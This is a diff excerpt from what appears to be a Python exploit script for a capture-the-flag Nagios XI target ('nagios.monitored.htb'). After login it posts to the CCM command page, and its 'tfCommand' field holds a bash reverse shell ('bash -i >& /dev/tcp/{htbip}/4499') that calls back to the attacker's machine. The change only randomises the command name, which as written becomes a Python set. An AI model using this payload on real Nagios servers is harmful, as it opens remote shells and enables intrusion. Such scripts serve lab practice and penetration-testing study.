@@ -92,10 +92,10 @@ for cookie in cookie_values:
 print("[+]logged in done")
 
 url2 = 'https://nagios.monitored.htb/nagiosxi/includes/components/ccm/index.php?type=command&page=1'
-
+name = random.randint(100, 99999)
 # Data to send in the POST request
 data2 = {
-    'tfName': 'revshell',
+    'tfName': {name},
     'tfCommand': f'bash -c \'bash -i >& /dev/tcp/{htbip}/4499 0>&1\'',
     'selCommandType': '1',
     'chbActive': '1',
